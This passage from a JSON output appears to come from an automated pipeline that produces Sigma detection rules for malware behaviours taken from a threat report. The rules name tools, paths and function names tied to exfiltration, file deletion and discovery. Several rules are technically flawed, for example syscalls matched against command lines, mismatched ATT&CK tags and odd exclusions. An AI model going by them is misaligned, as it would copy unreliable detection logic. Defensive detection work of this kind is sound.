          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.139,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "reg",
          "at",
          "ping",
          "zip",
          "net",
          "sc"
        ],
        "extraction_method": "nlp_indicator"
      }
    ]
  },
  "rules": {
    "status": "success",
    "summary": {
      "ttps_processed": 27,
      "rules_generated": 27,
      "langchain_generations": 48,
      "fallback_generations": 0,
      "errors": 0,
      "processing_time_ms": 25895.872
    },
    "rule_generation_results": [
      {
        "ttp_id": "unknown",
        "technique_name": "Pseudo-Terminal",
        "status": "success",
        "rule": {
          "title": "Pseudo-Terminal Setup via grantpt or posix_openpt",
          "description": "Detects the use of grantpt or posix_openpt system calls which may indicate pseudo-terminal setup for defense evasion",
          "logsource": {
            "category": "process_creation",
            "product": "linux",
            "service": null
          },
          "detection": {
            "selection_grantpt": {
              "CommandLine|contains": "grantpt"
            },
            "selection_posix_openpt": {
              "CommandLine|contains": "posix_openpt"
            },
            "condition": "selection_grantpt or selection_posix_openpt"
          },
          "falsepositives": [
            "Legitimate system administration tools or scripts that use pseudo-terminals for interactive sessions",
            "Development environments or automation tools (e.g., screen, tmux, expect) that invoke these system calls"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.T1070.007"
          ],
          "ttp_id": "unknown",
          "technique_name": "Pseudo-Terminal",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_0",
            "attack_id": "07134903-57bd-4f89-86d0-e4a8bc55fa19",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 491.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Network Communication",
        "status": "success",
        "rule": {
          "title": "Malicious Network Communication via Suspicious Socket Activity",
          "description": "Detects potential malware C2 communication by identifying processes performing socket receive and send operations, often indicative of command and control activity. Focuses on suspicious parent-child process relationships and excludes common benign scenarios.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_socket_ops": {
              "CommandLine|contains": [
                "socket_recv",
                "socket_send"
              ]
            },
            "exclusion_known_tools": {
              "CommandLine|contains|all": [
                "socket_recv",
                "socket_send",
                "python",
                "test"
              ]
            },
            "condition": "selection_socket_ops and not exclusion_known_tools"
          },
          "falsepositives": [
            "Legitimate development tools or scripts using socket functions for debugging or testing (e.g., Python scripts with 'socket_recv' in comments)",
            "Internal network monitoring tools that simulate socket operations"
          ],
          "level": "high",
          "tags": [
            "attack.t1071.004",
            "attack.command-and-control",
            "network-communication",
            "socket-activity"
          ],
          "ttp_id": "unknown",
          "technique_name": "Network Communication",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_1",
            "attack_id": "3a36093d-b7ed-46ff-8beb-579ad6cb2411",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 492.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Malicious Shell Execution via Command and Scripting Interpreter",
          "description": "Detects execution of shell commands using suspicious paths indicative of malicious activity, particularly focusing on /bin/sh and known malicious directory SpectralBlur/.macshare. Includes context to reduce false positives by excluding common benign parent processes.",
          "logsource": {
            "category": "process_creation",
            "product": "linux",
            "service": null
          },
          "detection": {
            "selection_sh": {
              "Image|endswith": "/bin/sh"
            },
            "selection_path": {
              "CommandLine|contains": "SpectralBlur/.macshare"
            },
            "condition": "selection_sh and selection_path"
          },
          "falsepositives": [
            "Legitimate administrative scripts that use /bin/sh and reference user-controlled paths",
            "Development or testing environments where similar path structures are used"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059",
            "malware.command_and_scripting_interpreter"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_2",
            "attack_id": "6b57d675-6d3c-416e-8a3c-aa19cb9f8ab5",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 286.00000000000006,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "File and Directory Permissions Modification",
        "status": "success",
        "rule": {
          "title": "File and Directory Permissions Modification via Malicious File Access",
          "description": "Detects modification of file and directory permissions associated with malware hiding in shared directories on macOS, specifically targeting the presence of suspicious files like /Users/Shared/.macshare and macshare.d",
          "logsource": {
            "category": "file_event",
            "product": "macos",
            "service": null
          },
          "detection": {
            "selection_paths": {
              "TargetFilename|contains": [
                "/Users/Shared/.macshare",
                "macshare.d"
              ]
            },
            "selection_behavior": {
              "Image|endswith": [
                "/chmod",
                "/chown",
                "/chmod.bak",
                "/chown.bak"
              ],
              "CommandLine|contains": [
                "-R",
                "777",
                "666",
                "+x",
                "a+rwx"
              ]
            },
            "condition": "selection_paths and selection_behavior"
          },
          "falsepositives": [
            "Legitimate system administration scripts modifying permissions on shared directories",
            "Automated configuration management tools (e.g., Ansible, Puppet) managing file permissions"
          ],
          "level": "high",
          "tags": [
            "attack.privilege_escalation",
            "attack.T1222",
            "macos",
            "file-permission-modification"
          ],
          "ttp_id": "unknown",
          "technique_name": "File and Directory Permissions Modification",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_3",
            "attack_id": "3d6a225f-ce87-4e76-83db-76d967d5e3d8",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 484.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Encrypted",
        "status": "success",
        "rule": {
          "title": "Malware Using xcrypt Function for Data Encryption",
          "description": "Detects the use of the xcrypt function or custom stream cipher in command-line arguments, which may indicate malware encrypting its configuration or network traffic as part of exfiltration.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_xcrypt": {
              "CommandLine|contains": "xcrypt"
            },
            "selection_custom_cipher": {
              "CommandLine|contains": "custom stream cipher"
            },
            "condition": "selection_xcrypt or selection_custom_cipher"
          },
          "falsepositives": [
            "Legitimate software using 'xcrypt' in command-line for non-malicious purposes (e.g., legacy encryption tools)",
            "Scripts or applications referencing 'custom stream cipher' in comments or debug output"
          ],
          "level": "high",
          "tags": [
            "attack.exfiltration",
            "attack.T1560"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Encrypted",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_4",
            "attack_id": "9812aae3-9eee-4678-843b-e07df74b68e0",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 1113.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Hollowing",
        "status": "success",
        "rule": {
          "title": "Process Hollowing via fork and posix_openpt",
          "description": "Detects process hollowing behavior involving fork and posix_openpt system calls which may indicate attempts to evade defenses by creating and manipulating child processes",
          "logsource": {
            "category": "process_creation",
            "product": "linux",
            "service": null
          },
          "detection": {
            "selection_fork": {
              "CommandLine|contains": "fork"
            },
            "selection_posix": {
              "CommandLine|contains": "posix_openpt"
            },
            "condition": "selection_fork and selection_posix"
          },
          "falsepositives": [
            "Legitimate development or debugging tools that use fork() and pseudo-terminal allocation for process management",
            "System utilities that programmatically spawn interactive shells using posix_openpt"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.T1055.012"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Hollowing",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_5",
            "attack_id": "49c9b9f6-85ba-41bd-b004-b588a0a60b50",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 329.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "status": "success",
        "rule": {
          "title": "Malware Create or Modify System Process via proc_testconn Function",
          "description": "Detects malware creating or modifying system processes through the use of the 'proc_testconn' function in command-line arguments, often indicative of malicious process manipulation for persistence.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_proc_testconn": {
              "CommandLine|contains": "proc_testconn"
            },
            "selection_tools": {
              "CommandLine|contains": [
                "wmic",
                "schtasks",
                "bitsadmin"
              ]
            },
            "condition": "selection_proc_testconn and selection_tools"
          },
          "falsepositives": [
            "Legitimate system administration scripts using wmic, schtasks, or bitsadmin with 'proc_testconn' in comments or variable names (rare)",
            "Development or testing environments where 'proc_testconn' is used in benign diagnostic tools"
          ],
          "level": "high",
          "tags": [
            "attack.t1053",
            "attack.t1129",
            "attack.persistence",
            "malware.command_execution"
          ],
          "ttp_id": "unknown",
          "technique_name": "Create or Modify System Process",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_6",
            "attack_id": "dd223b63-47ed-4882-b98f-1d32b4244f3f",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 501.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Creation",
        "status": "success",
        "rule": {
          "title": "Process Creation with Suspicious System Calls and Command-Line Tools",
          "description": "Detects process creation involving suspicious system calls (execve, fork) and commonly abused command-line tools which may indicate malicious activity such as living-off-the-land techniques.",
          "logsource": {
            "category": "process_creation",
            "product": "linux",
            "service": null
          },
          "detection": {
            "selection_execve": {
              "CommandLine|contains": "execve"
            },
            "selection_fork": {
              "CommandLine|contains": "fork"
            },
            "selection_abused_tools": {
              "CommandLine|contains": [
                "wmic",
                "schtasks",
                "bitsadmin"
              ]
            },
            "condition": "selection_execve or selection_fork or selection_abused_tools"
          },
          "falsepositives": [
            "Legitimate system administration scripts using wmic, schtasks, or bitsadmin",
            "Development or debugging tools invoking execve or fork system calls",
            "Scheduled task creation via schtasks by IT operations"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059",
            "attack.t1566",
            "linux",
            "process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Creation",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_7",
            "attack_id": "9f31c5a2-474c-47ab-bb97-845e8f25b3f2",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 365.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Staging",
        "status": "success",
        "rule": {
          "title": "Malware Data Staging via proc_upload and proc_download Functions",
          "description": "Detects potential data staging activity by identifying execution of functions named proc_upload and proc_download, commonly associated with malware exfiltration and staging behavior.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_proc_upload": {
              "CommandLine|contains": "proc_upload"
            },
            "selection_proc_download": {
              "CommandLine|contains": "proc_download"
            },
            "condition": "selection_proc_upload or selection_proc_download"
          },
          "falsepositives": [
            "Legitimate software or scripts using function names similar to proc_upload or proc_download for internal operations",
            "Administrative scripts that use similar naming conventions for file transfer operations"
          ],
          "level": "high",
          "tags": [
            "attack.exfiltration",
            "attack.T1566",
            "detection.malware",
            "behavior.data_staging"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Staging",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_8",
            "attack_id": "b1c49510-a2f3-40a5-b9b3-7565c3b9d756",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 258.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Indicator Removal on Host",
        "status": "success",
        "rule": {
          "title": "Indicator Removal on Host via proc_rmfile Function",
          "description": "Detects potential indicator removal on host by monitoring for execution of the proc_rmfile function, which may be used by malware to erase forensic traces",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_proc_rmfile": {
              "CommandLine|contains": "proc_rmfile"
            },
            "exclusion_known_tools": {
              "ParentImage|endswith": [
                "\\cmd.exe",
                "\\System"
              ],
              "Image|endswith": [
                "\\wmic.exe",
                "\\schtasks.exe",
                "\\bitsadmin.exe"
              ]
            },
            "condition": "selection_proc_rmfile and not (exclusion_known_tools)"
          },
          "falsepositives": [
            "Legitimate system maintenance scripts that use proc_rmfile (if such tools exist in rare cases)",
            "Administrative automation using command-line utilities with proc_rmfile in arguments (uncommon)"
          ],
          "level": "high",
          "tags": [
            "attack.defense-evasion",
            "attack.T1070.004"
          ],
          "ttp_id": "unknown",
          "technique_name": "Indicator Removal on Host",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_9",
            "attack_id": "c57fec32-ea2d-4607-b4f4-6ef4e7af0177",
            "detected": true,
            "events_found": 57,
            "historical_events": 0,
            "query_time_ms": 356.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "File and Directory Discovery",
        "status": "success",
        "rule": {
          "title": "File and Directory Discovery via proc_dir and Common CLI Tools",
          "description": "Detects execution of the proc_dir function or usage of command-line utilities (wmic, schtasks, bitsadmin) that are commonly abused for file and directory discovery. The rule excludes cases where the parent process is a standard command shell or system service to reduce false positives.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_proc_dir": {
              "Image|endswith": "\\proc_dir.exe",
              "CommandLine|contains": "proc_dir"
            },
            "selection_cli": {
              "Image|endswith": [
                "\\wmic.exe",
                "\\schtasks.exe",
                "\\bitsadmin.exe"
              ],
              "CommandLine|contains": [
                "wmic",
                "schtasks",
                "bitsadmin"
              ]
            },
            "excluded_parent_cmd": {
              "ParentImage|endswith": "\\cmd.exe"
            },
            "excluded_parent_services": {
              "ParentImage|endswith": "\\services.exe"
            },
            "condition": "(selection_proc_dir or selection_cli) and not excluded_parent_cmd and not excluded_parent_services"
          },
          "falsepositives": [
            "Legitimate administrative scripts using wmic, schtasks, or bitsadmin for system management",
            "Scheduled tasks created by IT staff that invoke these utilities",
            "System maintenance tools that call proc_dir-like functionality"
          ],
          "level": "medium",
          "tags": [
            "attack.t1083",
            "attack.discovery",
            "windows",
            "process_creation",
            "sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "File and Directory Discovery",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_10",
            "attack_id": "3ccf1905-af3b-4295-a337-59586394e936",
            "detected": true,
            "events_found": 46,
            "historical_events": 0,
            "query_time_ms": 314.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "System Network Connections Discovery",
        "status": "success",
        "rule": {
          "title": "Detection of System Network Connections Discovery via Command-line Tools",
          "description": "Detects processes that invoke network discovery commands such as netstat, wmic, schtasks, bitsadmin, or PowerShell network cmdlets, potentially indicating malware gathering system network connections information.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_netstat": {
              "Image|endswith": "\\netstat.exe"
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe"
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe"
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "Get-NetTCPConnection"
            },
            "selection_socket": {
              "CommandLine|contains": "socket_connect"
            },
            "selection_parent_exclude": {
              "ParentImage|endswith": "\\cmd.exe"
            },
            "condition": "(selection_netstat or selection_wmic or selection_schtasks or selection_bitsadmin or selection_powershell or selection_socket) and not selection_parent_exclude"
          },
          "falsepositives": [
            "Legitimate administrators running netstat for troubleshooting",
            "System monitoring scripts that use wmic or schtasks for inventory",
            "Bitsadmin used by Windows Update or other Microsoft services",
            "PowerShell scripts that query network connections for diagnostics"
          ],
          "level": "medium",
          "tags": [
            "attack.t1049",
            "discovery"
          ],
          "ttp_id": "unknown",
          "technique_name": "System Network Connections Discovery",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_11",
            "attack_id": "d833a3eb-96fd-45b3-8da4-735d256ff4e3",
            "detected": true,
            "events_found": 42,
            "historical_events": 0,
            "query_time_ms": 576.0000000000001,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "System Information Discovery",
        "status": "success",
        "rule": {
          "title": "Detection of System Information Discovery via gethostbyname, getlogin, and common discovery utilities",
          "description": "Detects processes that invoke system information discovery functions (gethostbyname, getlogin) or use common discovery command-line tools (wmic, schtasks, bitsadmin). The rule excludes typical parent processes such as explorer.exe, cmd.exe, and powershell.exe to reduce false positives.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_gethostbyname": {
              "CommandLine|contains": "gethostbyname"
            },
            "selection_getlogin": {
              "CommandLine|contains": "getlogin"
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe"
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe"
            },
            "legit_parent": {
              "ParentImage|endswith": [
                "\\explorer.exe",
                "\\cmd.exe",
                "\\powershell.exe"
              ]
            },
            "condition": "(selection_gethostbyname or selection_getlogin or selection_wmic or selection_schtasks or selection_bitsadmin) and not legit_parent"
          },
          "falsepositives": [
            "Legitimate administrative scripts using wmic, schtasks, or bitsadmin for routine maintenance",
            "Developers compiling or running code that calls gethostbyname or getlogin functions",
            "System processes that invoke these utilities as part of normal operation"
          ],
          "level": "medium",
          "tags": [
            "attack.t1082",
            "attack.discovery",
            "system_information_discovery"
          ],
          "ttp_id": "unknown",
          "technique_name": "System Information Discovery",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_12",
            "attack_id": "443f765f-e620-4322-a6c2-0a523d02fa55",
            "detected": true,
            "events_found": 44,
            "historical_events": 0,
            "query_time_ms": 527.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "System Network Configuration Discovery",
        "status": "success",
        "rule": {
          "title": "Detection of System Network Configuration Discovery via getsockopt and Common Admin Tools",
          "description": "Detects processes that invoke the getsockopt function or use common command-line tools associated with network configuration discovery (wmic, schtasks, bitsadmin). The rule excludes cases where the parent process is a standard command shell to reduce false positives.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_getsockopt": {
              "CommandLine|contains": "getsockopt"
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe"
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe"
            },
            "parent_cmd": {
              "ParentImage|endswith": "\\cmd.exe"
            },
            "parent_powershell": {
              "ParentImage|endswith": "\\powershell.exe"
            },
            "condition": "(selection_getsockopt or selection_wmic or selection_schtasks or selection_bitsadmin) and not (parent_cmd or parent_powershell)"
          },
          "falsepositives": [
            "Legitimate administrative scripts using wmic, schtasks, or bitsadmin for system management.",
            "Custom applications that call getsockopt as part of normal network operations.",
            "System utilities (e.g., ipconfig, netsh) that may be invoked by IT staff."
          ],
          "level": "medium",
          "tags": [
            "attack.discovery",
            "attack.t1016",
            "windows",
            "sysmon",
            "network"
          ],
          "ttp_id": "unknown",
          "technique_name": "System Network Configuration Discovery",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_13",
            "attack_id": "75659ecf-4e23-4485-b9f7-291e6e45dc10",
            "detected": true,
            "events_found": 46,
            "historical_events": 0,
            "query_time_ms": 373.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "System Owner/User Discovery",
        "status": "success",
        "rule": {
          "title": "System Owner/User Discovery via getpwuid and System Utilities",
          "description": "Detects processes that attempt to discover the system owner or user information by invoking the Linux `getpwuid` function or by using Windows utilities such as `wmic.exe`, `schtasks.exe`, and `bitsadmin.exe`. The rule excludes executions launched from common command shells to reduce false positives.",
          "logsource": {
            "category": "process_creation",
            "product": "linux",
            "service": "sysmon"
          },
          "detection": {
            "selection_linux": {
              "Image|endswith": "python",
              "CommandLine|contains": "getpwuid"
            },
            "selection_wmic": {
              "Image|endswith": "wmic.exe"
            },
            "selection_schtasks": {
              "Image|endswith": "schtasks.exe"
            },
            "selection_bitsadmin": {
              "Image|endswith": "bitsadmin.exe"
            },
            "parent_cmd": {
              "ParentImage|endswith": "cmd.exe"
            },
            "parent_powershell": {
              "ParentImage|endswith": "powershell.exe"
            },
            "condition": "(selection_linux or selection_wmic or selection_schtasks or selection_bitsadmin) and not (parent_cmd or parent_powershell)"
          },
          "falsepositives": [
            "Legitimate administrative scripts that use wmic, schtasks, or bitsadmin for system management.",
            "Python scripts that call getpwuid for legitimate user\u2011lookup functionality.",
            "Scheduled tasks or maintenance jobs that invoke these utilities from approved automation tools."
          ],
          "level": "medium",
          "tags": [
            "attack.discovery",
            "attack.t1033",
            "sysmon",
            "process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "System Owner/User Discovery",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_14",
            "attack_id": "81346fb5-8bab-48eb-9af8-dfa19a9fe2a0",
            "detected": true,
            "events_found": 52,
            "historical_events": 0,
            "query_time_ms": 533.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Application Window Discovery",
        "status": "success",
        "rule": {
          "title": "Application Window Discovery via proc_none and Common Enumeration Tools",
          "description": "Detects execution of the proc_none function or usage of common Windows enumeration utilities (wmic, schtasks, bitsadmin) that may be leveraged to gather application window information. Includes context checks to reduce false positives by excluding typical parent processes such as cmd.exe and services.exe.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_proc_none": {
              "Image|endswith": "\\proc_none.exe",
              "CommandLine|contains": "proc_none"
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe"
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe"
            },
            "parent_exclusion": {
              "ParentImage|endswith": "\\cmd.exe"
            },
            "parent_exclusion2": {
              "ParentImage|endswith": "\\services.exe"
            },
            "condition": "(selection_proc_none or selection_wmic or selection_schtasks or selection_bitsadmin) and not (parent_exclusion or parent_exclusion2)"
          },
          "falsepositives": [
            "Legitimate administrative scripts using wmic, schtasks, or bitsadmin for system management",
            "Scheduled tasks or maintenance jobs created by IT staff",
            "System processes invoking proc_none for legitimate purposes"
          ],
          "level": "medium",
          "tags": [
            "attack.t1010",
            "attack.discovery"
          ],
          "ttp_id": "unknown",
          "technique_name": "Application Window Discovery",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_15",
            "attack_id": "e5b972c3-6987-41c2-bd51-1c18f75ee8a6",
            "detected": true,
            "events_found": 53,
            "historical_events": 0,
            "query_time_ms": 350.00000000000006,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "System Time Discovery",
        "status": "success",
        "rule": {
          "title": "System Time Discovery via Command-Line Tools",
          "description": "Detects processes that query system time using common command-line utilities such as cmd.exe, powershell.exe, wmic.exe, schtasks.exe, or bitsadmin.exe, potentially indicating system time discovery activity.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "time_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "time"
            },
            "time_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "Get-Date"
            },
            "time_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": "os get LocalDateTime"
            },
            "time_schtasks": {
              "Image|endswith": "\\schtasks.exe",
              "CommandLine|contains": "/query"
            },
            "time_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": "/util"
            },
            "exclude_parent": {
              "ParentImage|endswith": "\\cmd.exe"
            },
            "condition": "(time_cmd or time_powershell or time_wmic or time_schtasks or time_bitsadmin) and not exclude_parent"
          },
          "falsepositives": [
            "Legitimate administrative scripts that query the system time.",
            "Scheduled tasks or maintenance jobs that include time checks.",
            "System utilities (e.g., time synchronization tools) that query the clock.",
            "Manual time verification by administrators using cmd or PowerShell."
          ],
          "level": "medium",
          "tags": [
            "attack.discovery",
            "attack.t1124"
          ],
          "ttp_id": "unknown",
          "technique_name": "System Time Discovery",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_16",
            "attack_id": "d7b195b6-b607-4813-8433-60a207a3e0c0",
            "detected": true,
            "events_found": 52,
            "historical_events": 0,
            "query_time_ms": 519.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "File Deletion",
        "status": "success",
        "rule": {
          "title": "File Deletion via Unlink API or Proc_Rmfile Function",
          "description": "Detects processes that invoke the unlink API or proc_rmfile function, which are commonly used by malware to delete files for defense evasion. Includes additional monitoring of command-line tools (wmic, schtasks, bitsadmin) used with delete operations and excludes benign parent processes to reduce false positives.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_unlink": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "unlink"
            },
            "selection_proc_rmfile": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "proc_rmfile"
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": "delete"
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe",
              "CommandLine|contains": "delete"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": "delete"
            },
            "benign_parent": {
              "ParentImage|endswith": "\\explorer.exe"
            },
            "condition": "(selection_unlink or selection_proc_rmfile or selection_wmic or selection_schtasks or selection_bitsadmin) and not benign_parent"
          },
          "falsepositives": [
            "Legitimate administrative scripts that use cmd.exe or PowerShell to delete temporary files via unlink or proc_rmfile.",
            "System maintenance tools (e.g., Disk Cleanup) that invoke delete operations.",
            "Scheduled tasks or WMIC commands used by IT staff for legitimate file removal."
          ],
          "level": "high",
          "tags": [
            "attack.t1070.004",
            "attack.defense_evasion",
            "windows",
            "sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "File Deletion",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_17",
            "attack_id": "5cb5c229-94b1-4f1e-8252-cbd14106e9b8",
            "detected": true,
            "events_found": 54,
            "historical_events": 0,
            "query_time_ms": 388.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Input Capture",
        "status": "success",
        "rule": {
          "title": "Detection of Input Capture via proc_getcfg and Common Command-line Tools",
          "description": "Detects execution of processes that invoke the proc_getcfg function or use command-line utilities commonly abused for input capture (wmic, schtasks, bitsadmin). The rule excludes executions launched from typical benign parent processes such as cmd.exe, powershell.exe, and explorer.exe to reduce false positives.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_proc_getcfg": {
              "CommandLine|contains": "proc_getcfg"
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe"
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe"
            },
            "parent_benign": {
              "ParentImage|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\explorer.exe"
              ]
            },
            "condition": "(selection_proc_getcfg or selection_wmic or selection_schtasks or selection_bitsadmin) and not parent_benign"
          },
          "falsepositives": [
            "Legitimate administrative scripts using wmic.exe for system queries",
            "Scheduled task creation via schtasks.exe by system administrators",
            "Bitsadmin.exe used by IT for legitimate file transfers",
            "Custom internal tools that may call proc_getcfg for configuration purposes"
          ],
          "level": "high",
          "tags": [
            "attack.collection",
            "attack.t1056",
            "windows",
            "sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Input Capture",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_18",
            "attack_id": "64fa6868-b208-4d8e-ab0c-1633b69eeabe",
            "detected": true,
            "events_found": 59,
            "historical_events": 0,
            "query_time_ms": 367.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
